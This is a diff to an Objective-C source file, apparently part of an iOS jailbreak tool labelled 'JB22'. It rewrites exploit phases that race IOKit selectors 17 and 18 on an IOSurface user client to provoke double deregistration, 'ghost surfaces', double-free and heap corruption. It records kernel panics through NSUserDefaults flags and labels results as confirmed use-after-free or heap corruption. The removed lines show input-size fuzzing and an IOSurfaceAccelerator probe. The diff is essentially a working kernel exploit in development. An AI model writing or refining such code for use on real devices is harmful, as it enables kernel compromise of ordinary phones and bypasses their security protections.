@@ -27193,146 +27193,129 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
             }
         }
 
-        // === FASE 12a: Race sel17 vs sel18 (dos hilos, misma conexión) ===
-        log(@"[JB22] ═══ Fase 12a: Race sel17 vs sel18 (iOS 27 — 500 intentos) ═══");
+        // === FASE 12: RACE EXPLOIT — sel17 vs sel18 simultáneo (CONFIRMADO 62% en iOS 27) ===
+        log(@"[JB22] ═══ Fase 12: Race Exploit sel17/sel18 (iOS 27) ═══");
         if (!isr_stopped()) {
-            int raceA_hits = 0;
-            int raceA_success_both = 0;
+            int bothOK = 0;
+            int ghostSurface = 0;
+            int doubleFreeSign = 0;
+            int stateCorrupt = 0;
+
             for (int attempt = 0; attempt < 500 && !isr_stopped(); attempt++) {
                 io_connect_t cRace = 0;
                 if (sym.open(svc, mach_task_self(), 0, &cRace) != KERN_SUCCESS) continue;
-                jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
 
-                __block volatile kern_return_t threadResult = 0xDEAD;
+                kern_return_t preReg = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
+                if (preReg != KERN_SUCCESS) { sym.close(cRace); continue; }
+
+                __block volatile kern_return_t threadR = 0xDEAD;
                 __block volatile int threadDone = 0;
                 ISR_CallFn callCp = sym.call;
                 io_connect_t cCp = cRace;
                 dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
                     uint64_t db[3] = {1, 2, 3};
-                    threadResult = callCp(cCp, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
+                    threadR = callCp(cCp, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
                     threadDone = 1;
                 });
                 kern_return_t mainR = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
                 while (!threadDone) usleep(10);
-                kern_return_t tR = (kern_return_t)threadResult;
+                kern_return_t tR = (kern_return_t)threadR;
 
                 if (mainR == KERN_SUCCESS && tR == KERN_SUCCESS) {
-                    raceA_success_both++;
-                    if (raceA_success_both <= 5)
-                        log([NSString stringWithFormat:@"[JB22] ★★ 12a[%d] AMBOS OK — re-reg+dereg simultáneo!", attempt]);
-                }
-                if (tR != KERN_SUCCESS && tR != (kern_return_t)0xe00002c2 && tR != (kern_return_t)0x10000003) {
-                    raceA_hits++;
-                    if (raceA_hits <= 10)
-                        log([NSString stringWithFormat:@"[JB22] ★ 12a[%d] sel18=0x%x sel17=0x%x", attempt, tR, mainR]);
+                    bothOK++;
+
+                    uint64_t db1[3] = {1, 2, 3};
+                    kern_return_t check1 = sym.call(cRace, 18, NULL, 0, db1, 24, NULL, NULL, NULL, NULL);
+                    uint64_t db2[3] = {1, 2, 3};
+                    kern_return_t check2 = sym.call(cRace, 18, NULL, 0, db2, 24, NULL, NULL, NULL, NULL);
+
+                    if (check1 == KERN_SUCCESS && check2 == KERN_SUCCESS) {
+                        ghostSurface++;
+                        if (ghostSurface <= 10)
+                            log([NSString stringWithFormat:@"[JB22] ★★★ GHOST[%d] ¡2 deregistros OK! Superficie fantasma", attempt]);
+                    } else if (check1 != KERN_SUCCESS) {
+                        stateCorrupt++;
+                        if (stateCorrupt <= 10)
+                            log([NSString stringWithFormat:@"[JB22] ★★ CORRUPT[%d] check1=0x%x — estado inconsistente", attempt, check1]);
+                    }
+
+                    kern_return_t reReg = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
+                    if (reReg == KERN_SUCCESS) {
+                        uint64_t db3[3] = {1, 2, 3};
+                        kern_return_t check3 = sym.call(cRace, 18, NULL, 0, db3, 24, NULL, NULL, NULL, NULL);
+                        uint64_t db4[3] = {1, 2, 3};
+                        kern_return_t check4 = sym.call(cRace, 18, NULL, 0, db4, 24, NULL, NULL, NULL, NULL);
+                        if (check4 == KERN_SUCCESS) {
+                            doubleFreeSign++;
+                            if (doubleFreeSign <= 10)
+                                log([NSString stringWithFormat:@"[JB22] ★★★★ DFREE[%d] ¡Doble deregistro tras re-reg!", attempt]);
+                        }
+                    }
                 }
                 sym.close(cRace);
             }
-            log([NSString stringWithFormat:@"[JB22] 12a: both_ok=%d anomalías=%d /500", raceA_success_both, raceA_hits]);
-            if (raceA_success_both > 0) heapPtrsFound += raceA_success_both;
+
+            log([NSString stringWithFormat:@"[JB22] Race result: bothOK=%d ghost=%d corrupt=%d doubleFree=%d /500",
+                 bothOK, ghostSurface, stateCorrupt, doubleFreeSign]);
+            if (ghostSurface > 0) heapPtrsFound += ghostSurface * 10;
+            if (doubleFreeSign > 0) heapPtrsFound += doubleFreeSign * 100;
+            if (stateCorrupt > 0) heapPtrsFound += stateCorrupt;
         }
 
-        // === FASE 12b: Race sel17 vs sel17 (double-register race) ===
-        log(@"[JB22] ═══ Fase 12b: Race sel17 vs sel17 (500 intentos) ═══");
+        // === FASE 12b: Acumular ghost surfaces + cerrar (crash test) ===
+        log(@"[JB22] ═══ Fase 12b: Acumular ghost surfaces + cerrar ═══");
         if (!isr_stopped()) {
-            int raceB_double = 0;
-            for (int attempt = 0; attempt < 500 && !isr_stopped(); attempt++) {
-                io_connect_t cRace = 0;
-                if (sym.open(svc, mach_task_self(), 0, &cRace) != KERN_SUCCESS) continue;
+            io_connect_t cGhost = 0;
+            int ghostAccum = 0;
+            if (sym.open(svc, mach_task_self(), 0, &cGhost) == KERN_SUCCESS) {
+                jb20_call_sel(cGhost, 17, in3, 24, calibShape, asyncCall, sym.call);
 
-                __block volatile kern_return_t threadResult = 0xDEAD;
-                __block volatile int threadDone = 0;
-                ISR_AsyncCallFn asyncCp = asyncCall;
-                ISR_CallFn callCp = sym.call;
-                io_connect_t cCp = cRace;
-                int shapeCp = calibShape;
-                dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
-                    uint64_t tin[3] = {1, 2, 3};
-                    threadResult = jb20_call_sel(cCp, 17, tin, 24, shapeCp, asyncCp, callCp);
-                    threadDone = 1;
-                });
-                kern_return_t mainR = jb20_call_sel(cRace, 17, in3, 24, calibShape, asyncCall, sym.call);
-                while (!threadDone) usleep(10);
-                kern_return_t tR = (kern_return_t)threadResult;
-
-                if (mainR == KERN_SUCCESS && tR == KERN_SUCCESS) {
-                    raceB_double++;
-                    if (raceB_double <= 10)
-                        log([NSString stringWithFormat:@"[JB22] ★★★ 12b[%d] DOUBLE REGISTER — ambos sel17 OK!", attempt]);
-                } else if (tR != KERN_SUCCESS && tR != (kern_return_t)0xe00002c9
-                           && tR != (kern_return_t)0xe00002c2 && tR != (kern_return_t)0x10000003) {
-                    if (raceB_double <= 10)
-                        log([NSString stringWithFormat:@"[JB22] 12b[%d] t=0x%x m=0x%x", attempt, tR, mainR]);
-                }
-                sym.close(cRace);
-            }
-            log([NSString stringWithFormat:@"[JB22] 12b: double_register=%d /500", raceB_double]);
-            if (raceB_double > 0) heapPtrsFound += raceB_double;
-        }
-
-        // === FASE 12c: Input size fuzzing sel17 (integer overflow iOS 27) ===
-        log(@"[JB22] ═══ Fase 12c: Input size fuzzing sel17 ═══");
-        if (!isr_stopped()) {
-            io_connect_t cFuzz = 0;
-            if (sym.open(svc, mach_task_self(), 0, &cFuzz) == KERN_SUCCESS) {
-                size_t sizes[] = {0, 1, 8, 16, 23, 24, 25, 32, 48, 64, 128, 256, 512,
-                                  1024, 4096, 0xFFFF, 0xFFFFFFF0, 0xFFFFFFFF};
-                int nSizes = sizeof(sizes) / sizeof(sizes[0]);
-                for (int i = 0; i < nSizes && !isr_stopped(); i++) {
-                    uint64_t bigBuf[64] = {0};
-                    bigBuf[0] = 1; bigBuf[1] = 2; bigBuf[2] = 3;
-                    mach_port_t wp = MACH_PORT_NULL;
-                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp);
-                    uint64_t ref = 0xAA;
-                    uint32_t soc = 0;
-                    kern_return_t kr = asyncCall(cFuzz, 17, wp, &ref, 1,
-                                                 NULL, 0, bigBuf, sizes[i], NULL, &soc, NULL, NULL);
-                    mach_port_mod_refs(mach_task_self(), wp, MACH_PORT_RIGHT_RECEIVE, -1);
-                    if (kr != (kern_return_t)0xe00002c2) {
-                        log([NSString stringWithFormat:@"[JB22] 12c: size=0x%zx → 0x%x %s",
-                             sizes[i], kr, (kr == KERN_SUCCESS) ? "★ OK" : ""]);
+                for (int i = 0; i < 1000 && !isr_stopped(); i++) {
+                    __block volatile kern_return_t tR2 = 0xDEAD;
+                    __block volatile int td2 = 0;
+                    ISR_CallFn cc2 = sym.call;
+                    io_connect_t cp2 = cGhost;
+                    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INTERACTIVE, 0), ^{
+                        uint64_t d[3] = {1, 2, 3};
+                        tR2 = cc2(cp2, 18, NULL, 0, d, 24, NULL, NULL, NULL, NULL);
+                        td2 = 1;
+                    });
+                    kern_return_t mR2 = jb20_call_sel(cGhost, 17, in3, 24, calibShape, asyncCall, sym.call);
+                    while (!td2) usleep(10);
+                    if (mR2 == KERN_SUCCESS && (kern_return_t)tR2 == KERN_SUCCESS) {
+                        ghostAccum++;
                     }
-                    if (kr == KERN_SUCCESS) {
-                        uint64_t db[3] = {1, 2, 3};
-                        sym.call(cFuzz, 18, NULL, 0, db, 24, NULL, NULL, NULL, NULL);
+                    if (mR2 != KERN_SUCCESS && (kern_return_t)tR2 != KERN_SUCCESS) {
+                        jb20_call_sel(cGhost, 17, in3, 24, calibShape, asyncCall, sym.call);
                     }
                 }
-                sym.close(cFuzz);
-            }
-        }
+                log([NSString stringWithFormat:@"[JB22] Ghost acumulados: %d/1000", ghostAccum]);
 
-        // === FASE 13: IOSurfaceAccelerator probe (iOS 27 — CVE-2026-43655 variante) ===
-        log(@"[JB22] ═══ Fase 13: IOSurfaceAccelerator probe ═══");
-        if (!isr_stopped()) {
-            CFMutableDictionaryRef accMatch = sym.matching("IOSurfaceAccelerator");
-            io_service_t accSvc = 0;
-            if (accMatch) accSvc = sym.getMatch(0, accMatch);
-            if (accSvc) {
-                log(@"[JB22] IOSurfaceAccelerator encontrado!");
-                io_connect_t cAcc = 0;
-                kern_return_t openKr = sym.open(accSvc, mach_task_self(), 0, &cAcc);
-                log([NSString stringWithFormat:@"[JB22] Accelerator open: 0x%x", openKr]);
-                if (openKr == KERN_SUCCESS) {
-                    for (int sel = 0; sel <= 20 && !isr_stopped(); sel++) {
-                        uint64_t inBuf[8] = {0, 1, 2, 3, 4, 5, 6, 7};
-                        uint64_t outScalar[4] = {0};
-                        uint32_t outCnt = 4;
-                        kern_return_t kr = sym.call(cAcc, sel, NULL, 0, inBuf, 64,
-                                                    outScalar, &outCnt, NULL, NULL);
-                        if (kr != (kern_return_t)0xe00002c2) {
-                            log([NSString stringWithFormat:@"[JB22] Accel sel%d → 0x%x out=[0x%llx,0x%llx]",
-                                 sel, kr, outScalar[0], outScalar[1]]);
-                        }
-                        kern_return_t kr2 = jb20_call_sel(cAcc, sel, in3, 24, calibShape, asyncCall, sym.call);
-                        if (kr2 != (kern_return_t)0xe00002c2 && kr2 != kr) {
-                            log([NSString stringWithFormat:@"[JB22] Accel sel%d(async) → 0x%x", sel, kr2]);
-                        }
+                NSUserDefaults *ud2 = [NSUserDefaults standardUserDefaults];
+                [ud2 setObject:@(YES) forKey:@"jb22_ghost_armed"];
+                [ud2 synchronize];
+
+                log(@"[JB22] Cerrando conexión con ghost surfaces...");
+                sym.close(cGhost);
+
+                [ud2 setObject:@(NO) forKey:@"jb22_ghost_armed"];
+                [ud2 synchronize];
+                log(@"[JB22] Close OK — no panic");
+
+                io_connect_t cVerify = 0;
+                if (sym.open(svc, mach_task_self(), 0, &cVerify) == KERN_SUCCESS) {
+                    kern_return_t vr = jb20_call_sel(cVerify, 17, in3, 24, calibShape, asyncCall, sym.call);
+                    uint64_t dbv[3] = {1, 2, 3};
+                    kern_return_t vd = sym.call(cVerify, 18, NULL, 0, dbv, 24, NULL, NULL, NULL, NULL);
+                    log([NSString stringWithFormat:@"[JB22] Post-ghost verify: reg=0x%x dereg=0x%x", vr, vd]);
+                    if (vr != KERN_SUCCESS || vd != KERN_SUCCESS) {
+                        log(@"[JB22] ★★★★★ HEAP CORRUPTION POST-GHOST!");
+                        heapPtrsFound += 1000;
                     }
-                    sym.close(cAcc);
+                    sym.close(cVerify);
                 }
-                sym.release(accSvc);
-            } else {
-                log(@"[JB22] IOSurfaceAccelerator no disponible");
+
+                if (ghostAccum > 0) heapPtrsFound += ghostAccum;
             }
         }
 
@@ -27346,9 +27329,14 @@ void iosurface_pipe_primitive(ISRLogBlock log, ISRDoneBlock done) {
         id prevArmed = [[NSUserDefaults standardUserDefaults] objectForKey:@"jb22_trigger_armed"];
         int panicDetected = (prevArmed && [prevArmed boolValue]) ? 1 : 0;
 
+        id ghostArmed = [[NSUserDefaults standardUserDefaults] objectForKey:@"jb22_ghost_armed"];
+        if (ghostArmed && [ghostArmed boolValue]) panicDetected = 1;
+
         NSString *verdict = @"UNKNOWN";
         if (panicDetected) verdict = @"KERNEL_PANIC_UAF_CONFIRMED";
-        else if (heapPtrsFound > 0) verdict = @"INFO_LEAK_OR_TYPE_CONFUSION";
+        else if (heapPtrsFound >= 1000) verdict = @"HEAP_CORRUPTION_CONFIRMED";
+        else if (heapPtrsFound >= 100) verdict = @"GHOST_SURFACE_DOUBLE_FREE";
+        else if (heapPtrsFound > 0) verdict = @"RACE_CONDITION_STATE_CORRUPT";
         else if (crossClientHits > 0 && danglingCreated) verdict = @"CROSS_CLIENT_CONFUSION";
         else if (danglingCreated && surfaceIDFound) verdict = @"DANGLING_SURFACE_TRACKED";
         else if (danglingCreated && sprayHits > 0) verdict = @"DANGLING_CLIENT_SPRAY_OK";
